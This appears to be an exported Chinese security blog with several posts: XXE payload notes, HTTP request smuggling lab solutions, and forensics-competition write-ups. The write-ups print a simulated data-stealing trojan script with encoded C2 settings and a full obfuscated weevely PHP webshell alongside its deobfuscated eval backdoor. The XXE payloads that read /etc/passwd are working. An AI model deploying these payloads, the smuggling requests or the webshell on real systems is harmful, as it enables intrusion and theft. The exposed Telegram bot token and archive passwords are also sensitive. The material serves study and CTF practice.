\u0026lt;message\u0026gt;any text\u0026lt;/message\u0026gt; evil.dtd：\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; error SYSTEM \u0026#39;file:///nonexistent/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %error; 不出网的情况，即无法从外部获取dtd，本质上对特殊符号再进行了一次预定义实体的转换：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % condition \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///nonexistent/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %condition; ]\u0026gt; \u0026lt;message\u0026gt;any text\u0026lt;/message\u0026gt; XXE特殊出现形式 SVG XXE \u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg width=\u0026#34;400px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 参考资料 https://developer.mozilla.org/zh-CN/docs/Web/XML/Guides/XML_introduction\nhttps://www.runoob.com/xml/xml-syntax.html\nhttps://www.w3schools.com/xml/xml_dtd.asp\nhttps://exp10it.io/posts/xxe-note/\nhttps://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/\nhttps://j7ur8.github.io/WebBook/VUL/%E6%8A%A5%E9%94%99XXE.html\n","permalink":"https://blog.w8nn9z.top/posts/web/xxe/","summary":"","title":"XXE"},{"content":"http走私问题本质为前端服务器 (负载均衡器/反向代理) 与后端服务器对于http请求的解析不一致，发生于 HTTP/1.1 协议中\nCL与TE HTTP规范提供了两种不同的方法来指定请求的结束位置\nCL：Content-Length，指定消息体的以字节为单位的长度\nPOST /search HTTP/1.1\rHost: normal-website.com\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 11\rq=smuggling TE：Transfer-Encoding，指定消息体的用途分块编码，每个块均由以 字节为单位的块大小（以十六进制表示）+ 换行符 + 块内容 组成\nPOST /search HTTP/1.1\rHost: normal-website.com\rContent-Type: application/x-www-form-urlencoded\rTransfer-Encoding: chunked\rb\rq=smuggling\r0 单个消息可能会同时使用这两种方法，从而使它们彼此冲突\n三种传统攻击 CL.TE 前端CL 后端TE\n靶场：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te\nThis lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\nexp：\n前端服务器识别CL，长度为6，将所有内容传给后端服务器，后端服务器识别TE，会把最后的G留在缓冲区，下一次http请求时会被合并\nTE.CL 前端TE 后端CL\n靶场：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl\nThis lab involves a front-end and back-end server, and the back-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\nexp：\n前端服务器识别TE，后端服务器识别CL，如果第一个CL为4，则正好将GPOST开始的body部分全部留在缓冲区，与下一次http请求合并\n注意最后面的 Content-Length 必须大于 5，5正好是最后0和两个换行符的长度，如果等于5后端服务器就不会再将走私的内容与下一条http请求合并， Content-Length 最大值根据下一个http请求包而定，最大值为 5 + http数据包长度\n下一个http请求包长度为704：\n注意要修改 Content-Length 的同时还要修改chunk大小：\n如果是710就会超时，因为只发送了一个http数据包，长度不足，后端服务器接收不到710长度的内容：\nTE.TE 前后端TE，目标是让其中一部分无法正常识别TE，从而转变为CL.TE或TE.CL\n靶场：https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header\nThis lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n靶场中的前端服务器对于TE的格式要求更宽松，可以处理格式错误的TE：\nTransfer-Encoding: xchunked\rTransfer-Encoding : chunked\rTransfer-Encoding: chunked\rTransfer-Encoding: x\rTransfer-Encoding:[tab]chunked\r[space]Transfer-Encoding: chunked\rX: X[\\n]Transfer-Encoding: chunked\rTransfer-Encoding\r: chunked 而后端服务器如果出现不符合要求TE格式则转而处理CL，因此可以转换为TE.CL\nexp：\n本质就是一个有两个TE的TE.CL\n漏洞检测 CL.TE 前端服务器根据CL获取4字节内容，后端服务器识别TE，但是未识别到终止符，继续等待新的chunk，导致超时\n最后的X用于区别TE.CL，因为TE只能用十六进制字符来标识内容长度，如果是TE.CL则会直接抛错：\nTE.CL 前端服务器识别TE，未获取到任何内容，后端服务器根据CL等待6字节导致超时\n参考资料：\nhttps://portswigger.net/web-security/request-smuggling\n","permalink":"https://blog.w8nn9z.top/posts/web/httpsmuggle/","summary":"","title":"http 走私"},{"content":"案情介绍 无\n检材解密/挂载 容器密码：GQ7aXryvOCM8qGeXa19K9g\u0026amp;jtHSGtrimps@QxaYt4oRwwKHeN0A$#EPv*u\nveracrypt：\n服务器取证 网站重构：\n一个master + 两个node节点，仿真设置为 NAT 模式，网段设置为192.168.50.1/24\n虚拟网络编辑，VMnet8：\n配置网关：\nk8s namespace kubectl get namespaces：\nk8s pod kubectl get pods -A：\nk8s service kubectl get services -A：\n关闭localhost的防火墙：\nsystemctl stop firewalld 重建数据库：\nkubectl apply -f mysql-c.yaml\rkubectl apply -f mysql-d.yaml\rkubectl apply -f mysql80-pvc.yaml mysql 和 redis 的服务都在正常运行：\nweb服务的yaml php-nginx-deployment.yaml：\n# php-nginx-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: php-nginx spec: replicas: 1 selector: matchLabels: app: php-nginx template: metadata: labels: app: php-nginx spec: containers: - name: php-nginx image: webdevops/php-nginx:7.4 ports: - containerPort: 80 env: - name: APP_USER value: \u0026#34;nginx\u0026#34; volumeMounts: - name: dujiaoka-pv-storage mountPath: /app - name: nginx-config mountPath: /opt/docker/etc/nginx/vhost.conf subPath: vhost.conf - name: supervisor-config mountPath: /opt/docker/etc/supervisor.d/dujiaoka.conf volumes: - name: dujiaoka-pv-storage persistentVolumeClaim: claimName: dujiaoka - name: nginx-config configMap: name: nginx-dujiaoka-config - name: supervisor-config configMap: name: dujiaoka-supervisor-config --- apiVersion: v1 kind: Service metadata: name: php-nginx-service spec: selector: app: php-nginx ports: - port: 80 targetPort: 80 指定了挂载的目录 mountPath: /app ，localhost机器中把 dujiaoka.tar 解压到 /app\n1.node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)\n源盘SHA256：\n答案：FC9A34\n2.集群配置了多少个node节点？（答案格式：1）\n答案：2\n3.嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）\n答案：09:35:59\n4.Docker的安装日期是？（使用双位数格式，答案格式：01月01日）\n答案：04月08日\n5.Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）\n查看 Docker 服务的环境变量配置 systemctl show docker --property Environment：\n答案：4780\n6.发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）\n查看 Kubernetes 集群中的 Service（服务）kubectl get svc：\n答案：30627\n7.发卡网站部署使用的镜像名称是？（答案格式：root/root）\n根据上题的服务去找对应镜像：\n答案：webdevops/php-nginx\n8.当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）\n查看特定命名空间中的特定Pod详情 kubectl describe pod captcha-bot-6b4d85b765-4ntkh -n default：\n9.发卡网站使用的缓存数据库是？（答案格式：mysql）\npod里有redis\n答案：redis\n10.集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）\n答案：/data/k8s_data/default/dujiaoka\n11.Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）\nlocalhost机器 /data/k8s_data/default/captchaBot/config/config.toml：\n#系统设置 [system] app_debbug=false join_hint_after_del_time=60 # 加群验证提示消息多久删除，秒 captcha_timeout=120 # 验证超时时间，秒 runtime_path=\u0026#34;/runtime\u0026#34; # 缓存目录 #telegram 配置 [telegram] bot_token=\u0026#34;8378348497:AAGSu7pC5rrDicjMqa7Mv9atvB1iE5NAZeY\u0026#34; # 机器人apitoken api_proxy=\u0026#34;http://kk.xilika.cc\u0026#34; # telegram api代理，仅大陆地区服务器需要 manage_users=[6213151597] # 超级管理员userid数组，以英文逗号分割，例如123,456,789 #日志配置 [log] max_size=32 max_age=7 max_backups=3 #消息模板 [message] join_hint=\u0026#34;欢迎 [%s](%s) 加入 %s\\n ⚠️本群已开启新成员验证功能，未通过验证的用户无法发言 \\n超时未完成验证会被移除本群！ \\n⏱本条消息 %d 秒后自动删除\\n👇点击下方按钮自助解除禁言\u0026#34; captcha_image=\u0026#34;欢迎您加入[%s]！\\n⚠本群已开启新成员验证功能。\\n👆为了证明您不是机器人，请发送以上图片验证码内容\\n🤖机器人将自动验证您发送的验证码内容是否正确\\n⏱本条验证消息有效期[%d]秒\u0026#34; verification_complete=\u0026#34;恭喜您成功通过[🤖人机验证]，系统已为您解除禁言限制。\\n如若还是无法发言，请重启telegram客户端\\n请同时注意群内发言规范，以防永久禁止\u0026#34; block_hint=\u0026#34;\\\\#封禁预警\\n[%s](%s) 请注意,您的消息中含有部分违禁词 \\n⚠️您已被系统判断为高风险用户，已被封禁\\n系统已向超管发送预警信息，若由超管判定为误杀，会及时将您解除封禁。\\n您的违禁词包含：%s\u0026#34; #广告阻止 [adblock] number_of_forbidden_words=2 # 违禁词判定个数，如果一句话中出现的违禁词为该设置个数，则判断为违禁 block_time=-1 # 阻止时间，单位：秒。如果为-1，则代表永久封禁 答案：kk.xilika.cc\n12.嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）\n答案：西门庆交流群\n13.统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）\ncaptchabot数据库查询：\nSELECT COUNT(*) FROM user_captcha_record WHERE captcha_success_time \u0026gt;= \u0026#39;2025-06-01\u0026#39; ; 答案：2422\n14.据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）\n15. 发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）\n16.发卡网站的后台访问路径是？（答案格式：/root）\nlocalhost机器上有dujiaoka.tar，解压就是网址源码，.env：\n答案：/admin\n17.计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）\n仍然是.env：\n答案：UudHxLyk7HqpUcTQ99p6NZMFxC7eInhkagTLks8oYfk=\n18.发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）\n19. 当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）\n/config/dujiaoka.php：\n答案：2.0.5\n20. 当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）\n流量包分析 21.黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）\n22.黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）\n使用过滤器 eapol 可以快速定位 WPA 握手的相关报文：\n答案：4\n23.黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）\n24.黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）\n答案：Linux ImmortalWrt\n25.黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）\n26.黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）\n27.黑客在路由器管理后台发现FTP服务配置，FTP登录密码为?（答案格式:请按实际值填写）\n过滤 FTP 协议：\n答案：mast\n28.黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）\n找PK头：\n爆破密码 4321：\n答案：code:123456789\n29.黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）\n几个反弹shell关键词都找一遍，nc：\n答案：4445\n30.黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)\n根据ip 192.168.1.244 来过滤，再翻到最下面的部分找：\n执行的命令：\nipconfig\runame -a\rcd /root\rls 答案：4\nAPK程序分析 31.apk 的版本名称为？ （答案格式：1.1.1）\nAndroidManifest.xml：\nandroid:versionName=\u0026#34;3.0.12\u0026#34; 答案：3.0.12\n32.在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）\n在线网站 51.al 脱壳，jadx 反编译 classes2.dex：\n答案：currentTimeMillis\n33.apk运行后getVer()的返回值是多少？（答案格式：1.0.0）\n计算机取证分析 41.操作系统的 Build 版本号是？（答案格式：1）\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion：\n答案：19044\n42.操作系统设置的账户密码最长存留期为多少天？（答案格式：1）\n仿真后命令行输入 net accounts ：\n答案：68\n46.123.VHD 所处的结束扇区是？（答案格式：1）\n先找到 123.vhd，在 C:\\\\Administrator\\Documents 中，在 File 选中文件尾部或直接 Ctrl+End，再回到 Partition 即可找到文件结束扇区：\n答案：27445225\n物联网设备取证分析 66.打印机的主机名称是什么？(答案格式：root)\n答案：print\n67.打印文件存储在哪个目录？(答案格式：/root/root)\n/etc/cups/cups-files.conf：\n# Location of all spool files... #RequestRoot /var/spool/cups 答案：/var/spool/cups\n68.同一天，打印两份文件的用户是谁？(答案格式：root)\n/var/log/cups/page_log：\n答案：alice\n69.分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）\n木马 /usr/local/bin/cups-helper：\n#!/usr/bin/python3 # -*- coding: utf-8 -*- # A helper script to manage CUPS spooling and perform health checks. # Do not modify unless you are an authorized technician. # KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ====== import os import shutil import socket import datetime import re # --- Configuration --- # C2 server for uploading diagnostic data C2_SERVER = \u0026#34;zUTMugDMx4SO5EjL1gTM\u0026#34; C2_PORT = \u0026#34;zQDN\u0026#34; # Spool directory to monitor SPOOL_DIR = \u0026#34;GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ\u0026#34; # Define staging directory for processing before exfiltration STAGING_DIR = \u0026#34;GJTJlh2YhNmLGJTJw1GdGJTJ\u0026#34; # Log file for upload activities LOG_FILE = \u0026#34;==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ\u0026#34; # Keyword to identify sensitive documents for \u0026#34;special handling\u0026#34; WATCHED_KEYWORD = \u0026#34;=UmcpZmbvdWYyREMyUCdjVmavJHU\u0026#34; # --- End Configuration --- def log_message(message): \u0026#34;\u0026#34;\u0026#34;Appends a timestamped message to the log file.\u0026#34;\u0026#34;\u0026#34; now = datetime.datetime.now().strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;) full_message = f\u0026#34;[{now}] {message}\\n\u0026#34; with open(LOG_FILE, \u0026#39;a\u0026#39;) as f: f.write(full_message) def scan_and_stage(): \u0026#34;\u0026#34;\u0026#34;(Simulated) Scans the spool directory and copies sensitive files to the staging area.\u0026#34;\u0026#34;\u0026#34; pass def exfiltrate_data(): \u0026#34;\u0026#34;\u0026#34;(Simulated) \u0026#39;Uploads\u0026#39; files from the staging directory to the C2 server.\u0026#34;\u0026#34;\u0026#34; if not os.path.exists(STAGING_DIR): return staged_files = os.listdir(STAGING_DIR) if not staged_files: return try: # The system log entry shows this connection attempt. # This part of the script provides the \u0026#34;ground truth\u0026#34; for that log. sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) # sock.connect((C2_SERVER, C2_PORT)) for filename in staged_files: log_message(f\u0026#34;SUCCESS: Uploaded {filename} to {C2_SERVER}\u0026#34;) sock.close() except Exception as e: log_message(f\u0026#34;ERROR: Could not connect to C2 server: {e}\u0026#34;) def main(): scan_and_stage() exfiltrate_data() if __name__ == \u0026#34;__main__\u0026#34;: main() 答案：2177\n70.分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）\n火眼的定时任务只分析了 /etc/crontab 文件里的内容，/etc/cron.d 目录下还有其他的定时任务，healthcheck：\n答案：10\n71.分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）\n先逆置再解base64：GJTJlh2YhNmLGJTJw1GdGJTJ\n答案：/tmp/.cache/\n72.分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）\n先逆置再解base64：zUTMugDMx4SO5EjL1gTM\n答案：185.199.108.153\n73.根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）\n先逆置再解base64：=UmcpZmbvdWYyREMyUCdjVmavJHU\n答案：Project Dragonfire\n移动终端取证分析 火眼识别不了rar，先解压再把data压缩成zip\n74.分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）\n答案：8390\n75.分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）\n答案：09月24日\n76.找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）\n答案：3FE61F\n77.分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）\n答案：85A51D\n78.手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）\n宽高爆破：\n$ python 1.py -f 1.PNG 宽高被改了, 是否CRC爆破宽高? (Y/n):Y CRC32: 0xf2e8fe18 宽度: 1809, hex: 0x711 高度: 222, hex: 0xde 答案：boost\n79.找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）\n答案：delay\n80.找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）\n全局搜索 助记词3 ，可以找到备忘录文件，直接打开看不到，藏在文件尾：\n答案：quarter\n81.分析出该组助记词正常顺序中最后一个单词（已知助记词1.助记词2.助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）\n82.分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）\n答案：刘佳雨\n83.得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）\n答案：dingtong.saichuang\n84.接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）\n数据库 dingtong.db 被加密过\n85.接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）\n86.厉明的身份证地址登记的门牌号是多少？？（答案格式：1）\n身份证_f33.mxt是个zip，需要密码：\n密码：bwX2ZEfE9\n答案：722\n87.分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）\nimportant1.xlsx需要密码\n密码：3;s=]-\n答案：935629\n88.接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）\n答案：3357\n","permalink":"https://blog.w8nn9z.top/posts/forensics/szb2025cs/","summary":"","title":"数证杯 2025 初赛"},{"content":"案情介绍 无\n检材下载 下载链接：https://pan.baidu.com/s/1rVW8I7nE_XRtIfahGPm_eQ?pwd=ktf8\n哈希值：MD5值：4AAA79BA46C2065FC5C4D5DC97202F3D\n挂载/解压密码：/TP2G-h`q#(Ss!EUq,RR:Ss9\u0026quot;@!R\u0026quot;{-.kNw+-(gwGq.YLDS-|NEWH(GT3;6;\n检材解密/挂载 veracrypt：\n网络流量分析 网络流量分析-1 分析网络流量包检材，写出抓取该流量包时所花费的秒数？（填写数字，答案格式：10）\n答案：3504\n网络流量分析-2 分析网络流量包检材，抓取该流量包时使用计算机操作系统的 build 版本是多少？（答案格式：10D32）\n统计-\u0026gt;捕获文件属性：\n答案：23F79\n网络流量分析-3 分析网络流量包检材，受害者的 IP 地址是？（答案格式：192.168.1.1）\nhttp协议：\n答案：192.168.75.131\n网络流量分析-4 分析网络流量包检材，受害者所使用的操作系统是？（小写字母，答案格式：biwu）\n随便找个http查看数据包：\n答案：ubuntu\n网络流量分析-5 分析网络流量包检材，攻击者使用的端口扫描工具是？（小写字母，答案格式：abc）\n答案：nmap\n网络流量分析-6 分析网络流量包检材，攻击者使用的漏洞检测工具的版本号是？（答案格式：1.1.1）\nhttp数据包中UA头 Wfuzz/3.1.0\n答案：3.1.0\n网络流量分析-7 分析网络流量包检材，攻击者通过目录扫描得到的 phpliteadmin 登录点是？（答案格式：/abc/abc.php）\n答案：/dbadmin/test_db.php\n网络流量分析-8 分析网络流量包检材，攻击者成功登录到 phpliteadmin 时使用的密码是？（答案格式：按实际值填写）\n找最后一个访问/dbadmin/test_db.php不带参数的\n答案：admin\n网络流量分析-9 分析网络流量包检材，攻击者创建的 phpinfo 页面文件名是？（答案格式：abc.txt）\n找一个比较大的http对象：\n答案：demo.php\n网络流量分析-10 分析网络流量包检材，攻击者利用服务器漏洞从攻击机上下载的 payload 文件名是？（答案格式：abc.txt）\n答案：rev.txt\n网络流量分析-11 分析网络流量包检材，攻击者反弹 shell 的地址及端口是？（答案格式：192.168.1.1:1234）\n分析payload：\n答案：192.168.75.132:30127\n网络流量分析-12 分析网络流量包检材，攻击者电脑所使用的 Python 版本号是？（答案格式：1.1.1）\n答案：3.11.8\n网络流量分析-13 分析网络流量包检材，受害者服务器中网站所使用的框架结构是？（答案格式：thinkphp）\n答案：wordpress\n网络流量分析-14 分析网络流量包检材，攻击者获取到的数据库密码是？（答案格式：大小写按实际值填写）\n答案：sWfCsfJSPV9H3AmQzw8\n网络流量分析-15 分析网络流量包检材，攻击者上传了一个 weevely 木马进行权限维持，上传时所使用的端口号是？（答案格式：3306）\n答案：2000\n网络流量分析-16 分析网络流量包检材，攻击者上传了一个 weevely 木马进行权限维持，该木马第一次执行时获取到的缓冲区内容是？（答案格式：按实际值填写）\ndzINRguo2g6mkn7ycbbf9691e009G6pSUAZWgTBjNUtkPw==85a89e92c410\nhelp.php：\n\u0026lt;?php $q=\u0026#39;uv1o2g6mkn7y\u0026#34;;fv1unctiv1ov1n x(v1$t,$k){$c=v1strlen(v1$k)v1;v1$l=strlenv1($t);$o\u0026#39;; $k=\u0026#39;tents(v1\u0026#34;php://iv1nput\u0026#34;),$v1mv1)==1) {@ov1b_start();v1@ev1val(@v1gzuncomv1press(@x(@\u0026#39;; $A=\u0026#39;$k=\u0026#34;c6v1ae1ev170\u0026#34;;$khv1=\u0026#34;cbbf9v1691e009\u0026#34;;v1$v1kv1f=\u0026#34;85a8v19e92c410\u0026#34;;$p=\u0026#34;dv1zINv1Rg\u0026#39;; $o=\u0026#39;=\u0026#34;v1\u0026#34;;forv1($i=0;$v1iv1v1\u0026lt;$l;){fv1v1or($j=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$lv1);$j++,$i++)v1{v1$o.=v1$t{$i}^\u0026#39;; $D=str_replace(\u0026#39;cM\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cMcreacMte_cMfcMunccMcMtion\u0026#39;); $Q=\u0026#39;$k{$j}v1v1;}}return v1$o;v1}if (@pregv1_v1match(\u0026#34;/v1$kh(.+)v1v1$kf/\u0026#34;,@v1fv1ile_get_cov1n\u0026#39;; $Z=\u0026#39;leanv1();$r=@base6v14_ev1ncv1ode(v1@x(@gzcov1mpress($ov1),$v1kv1));printv1(\u0026#34;$p$kh$r$kf\u0026#34;);}\u0026#39;; $w=\u0026#39;v1basev164_decodev1($mv1[v11]),$v1k)));$o=@ov1b_get_contev1nts(v1v1);@ob_env1d_c\u0026#39;; $S=str_replace(\u0026#39;v1\u0026#39;,\u0026#39;\u0026#39;,$A.$q.$o.$Q.$k.$w.$Z); $C=$D(\u0026#39;\u0026#39;,$S);$C(); ?\u0026gt; 去混淆：\n\u0026lt;?php function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; $l;) { for ($j = 0; ($j \u0026lt; $c \u0026amp;\u0026amp; $i \u0026lt; $l); $j++, $i++) { $o .= $t{$i} ^ $k{$j}; } } return $o; } $k = \u0026#34;c6ae1e70\u0026#34;; $kh = \u0026#34;cbbf9691e009\u0026#34;; $kf = \u0026#34;85a89e92c410\u0026#34;; $p = \u0026#34;dzINRguo2g6mkn7y\u0026#34;; if (@preg_match(\u0026#34;/$kh(.+)$kf/\u0026#34;, @file_get_contents(\u0026#34;php://input\u0026#34;), $m) == 1) { @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]), $k))); $o = @ob_get_contents(); @ob_end_clean(); $r = @base64_encode(@x(@gzcompress($o), $k)); print(\u0026#34;$p$kh$r$kf\u0026#34;); } ?\u0026gt; G6pSUAZWgTBjNUtkPw== 是加密的获取结果，进行解密：\n\u0026lt;?php function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; $l;) { for ($j = 0; ($j \u0026lt; $c \u0026amp;\u0026amp; $i \u0026lt; $l); $j++, $i++) { $o .= $t{$i} ^ $k{$j}; } } return $o; } $k = \u0026#34;c6ae1e70\u0026#34;; $r = \u0026#34;G6pSUAZWgTBjNUtkPw==\u0026#34;; $o = gzuncompress(x(base64_decode($r), $k)); print($o); ?\u0026gt; 答案：57638\n手机取证 手机取证-1 对手机镜像进行分析，机主微信 ID 号为？（答案按照实际填写，字母全小写）\n答案：wxid_gvlyzqeyg83o22\n手机取证-2 对手机镜像进行分析，机主在 2023 年 12 月登录宝塔面板使用的验证码为？（填写数字，答案格式如：1234）\n答案：482762\n手机取证-3 对手机镜像进行分析，小众即时通讯 “鸽哒” 应用程序的最后更新时间为？（答案格式如：1970-01-01 00:00:00）\n答案：2024-09-20 09:25:19\n手机取证-4 对手机镜像进行分析，该手机中记录的最后一次开机时间。（答案格式如：1970-01-01 00:00:00）\n答案：2024-10-24 11:27:14\n手机取证-5 对手机镜像进行分析，该手机中高德地图 APP 应用的登录 ID 为？（答案按照实际填写）\n答案：950980338\n手机取证-6 对手机镜像进行分析，该手机中高德地图 APP 应用登录账号头像的 SHA-256 值前 8 位为？（答案格式：大写字母与数字组合，如：D23DDF44）\n分区4/media/0/Android/data/com.autonavi.minimap/files/autonavi/avatar：\n答案：8F8A68A3\n手机取证-7 对手机镜像进行分析，其中 20220207-20230206 的微信账单文件的解压密码为？（答案格式：按实际值填写）\n答案：847905\n手机取证-8 对手机镜像进行分析，机主在手机中存储的一张复古土砌矮墙照片的拍摄地为哪个城市？（答案格式：北京市）\n答案：景德镇市\n手机取证-9 对手机镜像进行分析，通过 AI 合成的人脸照片中，有几张照片是通过本机当前安装的 AI 照片合成工具生成，并有对应记录的 ？（填写数字，答案格式如：1234）\n答案：3\n手机取证-10 对手机镜像进行分析，统计出通讯录号码归属地第二多的省份是？（答案格式：广东）\n通讯录里简单统计一下\n答案：福建\n手机取证-11 对手机镜像进行分析，找出 “季令柏” 身份证号后 4 位为？（答案格式：1234）\n添加文件头就能看到图片：\n答案：8043\n手机取证-12 对手机镜像进行分析，找出接收 “葵花宝典 1.doc” 文件使用的应用程序的第一次安装时间为？（答案格式如：1970-01-01 00:00:00）\ntelegram安装时间：\n答案：2024-09-20 09:29:40\n手机取证-13 对手机镜像进行分析，机主使用的小众即时通讯应用使用的服务器 IP 为？（答案格式：127.0.0.1）\n答案：163.179.125.64\n手机取证-14 对手机镜像进行分析，机主在哪个平台上发布过转让传奇游戏币的信息，请写出该平台应用 APP 的包名？（答案格式：com.abcd）\n95分是交易网站\n答案：com.jiuwu\n手机取证-15 对手机镜像进行分析，其中有一 “双色球” 网页的玩法规则中定义的 “三等奖” 的奖金是多少？（填写数字，答案格式如：1234）\n随记备忘录中存取了网址：\nhttps://www.cwl.gov.cn/fcpz/yxjs/ssq/\n答案：3000\n手机取证-16 对手机镜像进行分析，找出手机连接过的米家摄像头终端设备的用户 ID 为？（答案格式：答案按照实际填写）\n答案：2968704175\n手机取证-17 对手机镜像进行分析，找出手机连接过的米家摄像头终端设备的 IP 地址为？（答案格式：127.0.0.1）\n答案：192.168.110.106\n计算机取证 计算机取证-1 对计算机镜像进行分析，计算该镜像中 ESP 分区的 SM3 值后 8 位为？（答案格式：大写字母与数字组合，如：D23DDF44）\nESP分区是EFI系统分区，用于存储引导加载程序和与系统启动相关的文件，可以快速定位：\n答案：BDBE1073\n计算机取证-2 对计算机镜像进行分析，该操作系统超管账户最后一次注销时间为？（时区为 UTC+08:00）（答案格式如：1970-01-01 00:00:00）\n答案：2024-10-25 22:57:32\n计算机取证-3 